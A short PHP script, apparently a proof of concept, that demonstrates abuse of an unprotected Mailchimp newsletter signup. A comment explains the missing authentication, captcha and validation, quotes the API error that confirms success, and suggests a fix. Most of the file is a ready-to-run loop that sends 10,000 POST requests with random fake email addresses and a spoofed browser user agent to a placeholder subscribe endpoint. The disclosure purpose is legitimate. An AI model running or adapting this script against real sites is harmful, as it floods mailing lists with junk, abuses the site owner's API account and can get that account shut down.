<?php

/**
 * Example of attack on a bad mailchimp integration, the remote host query mailchimp api without 
 * authenfication, captcha or validation.
 *
 * Attacker can automatically fill the customer list with fake or legitimate
 * email addresses using a script like the one provided below.
 * 
 * It is against the mailchimp API usage policy and will result in account closed if not
 * fixed properly.  
 *
 * The remote host also display mailchimp errors, confirming the attack success.
 * {"type":"http://developer.mailchimp.com/documentation/mailchimp/guides/error-glossary/","title":"Member Exists","status":400,"detail":"myemail@gmail.com is already a list member. Use PUT to insert or update list members.","instance":"47755cb2-6461-4c83-9cdc-ebcd40ccec8b"}
 *
 * Solution: Do not use ajax to query mailchimp, validate locally, use captcha.
 */

for ($i=0;$i<10000;$i++) {

    $email = md5(rand(1, 99999999999999));
    $post = ['email'=>$email.'@gmail.com', 'gender'=>'men', 'source' => 'EXAMPLE_EN_NOPROD_SEARCH' ];

    $h = curl_init();
    curl_setopt( $h, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0" );
    curl_setopt( $h, CURLOPT_URL, "https://www.example.com/en-us/newsletters/subscribers" );
    curl_setopt( $h, CURLOPT_POST, 1 );
    curl_setopt( $h, CURLOPT_POSTFIELDS, $post );
    curl_setopt( $h, CURLOPT_RETURNTRANSFER, true );

    $r = curl_exec ( $h );
    $info = curl_getinfo( $h );
}
